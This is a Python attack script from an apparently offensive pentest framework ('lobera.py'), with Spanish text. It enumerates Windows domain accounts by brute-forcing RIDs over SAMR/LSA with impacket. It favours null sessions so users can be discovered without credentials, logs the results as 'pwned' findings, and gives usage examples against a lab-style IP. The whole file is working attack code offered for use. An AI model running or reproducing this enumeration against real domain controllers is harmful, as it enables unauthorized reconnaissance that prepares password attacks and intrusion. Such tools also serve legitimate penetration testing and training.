# scripts/rpc/attack/rid-brute.py

from scripts.base import BaseScript
from core.output import print_result, print_table, console
from core import session_db

try:
    from modules.rpc import RPCModule
    _RPC_OK = True
except ImportError:
    _RPC_OK = False


class Script(BaseScript):
    name        = "rid-brute"
    protocol    = "rpc"
    category    = "attack"
    description = (
        "Enumera cuentas por fuerza bruta de RIDs vía SAMR/LSA. "
        "Funciona con null session si el DC lo permite — descubrimiento de usuarios "
        "sin credenciales. RIDs 500-10000 por defecto."
    )

    EXAMPLES = [
        {
            "flag":  "-t (sin -u/-p)",
            "desc":  "Intentar con null session primero (funciona en entornos legacy)",
            "good":  "lobera.py rpc --script=rid-brute -t 10.129.1.5",
            "bad":   "lobera.py rpc --script=rid-brute -t 10.129.1.5 -u iker -p 'Pass1'  [con credenciales válidas usa users directamente]",
        },
        {
            "flag":  "--rid-start / --rid-end",
            "desc":  "Rango de RIDs a probar (default: 500-10000)",
            "good":  "lobera.py rpc --script=rid-brute -t 10.129.1.5 --rid-start 500 --rid-end 2000",
            "bad":   "lobera.py rpc --script=rid-brute -t 10.129.1.5 --rid-end 50000  [muy lento, pocas cuentas más arriba de 10000]",
        },
    ]

    def run(self, **kwargs):
        if not _RPC_OK:
            print_result("RPC", str(self.target.ip), "fail", "modules/rpc.py no disponible"); return []

        rid_start = int(kwargs.get("rid_start", 500))
        rid_end   = int(kwargs.get("rid_end", 10000))

        rpc = RPCModule(self.target, self.creds)
        if not rpc.connect(): return []
        try:
            from impacket.dcerpc.v5 import samr as _samr
            from impacket.dcerpc.v5.rpcrt import DCERPCException

            dce = rpc._dce_samr()
            _, dom_h, domain_name, domain_sid = rpc._samr_open_domain(dce)

            print_result("RPC", str(self.target.ip), "info",
                         "RID brute: dominio '{}', rango {}-{}".format(
                             domain_name, rid_start, rid_end))

            found = []
            for rid in range(rid_start, rid_end + 1):
                try:
                    resp = _samr.hSamrRidToSid(dce, dom_h, rid)
                    sid_str = resp["Sid"].formatCanonical()

                    # Intentar resolver nombre
                    name_info = rpc.lookup_sids([sid_str])
                    name = name_info[0]["name"] if name_info else sid_str

                    found.append({"rid": rid, "sid": sid_str, "name": name})
                    print_result("RPC", str(self.target.ip), "ok",
                                 "RID {} → {}".format(rid, name))
                    session_db.save_finding(
                        str(self.target.ip), "RPC", "rid_brute",
                        "RID={} name={} sid={}".format(rid, name, sid_str),
                    )
                except DCERPCException:
                    pass  # RID no existe o acceso denegado

            if found:
                print_table(
                    "Cuentas encontradas ({})".format(len(found)),
                    ["RID", "Nombre", "SID"],
                    [(str(f["rid"]), f["name"], f["sid"]) for f in found],
                )
                print_result("RPC", str(self.target.ip), "pwned",
                             "{} cuentas encontradas por RID brute".format(len(found)))
            else:
                print_result("RPC", str(self.target.ip), "info",
                             "No se encontraron cuentas en el rango indicado")

            return found
        finally:
            rpc.disconnect()
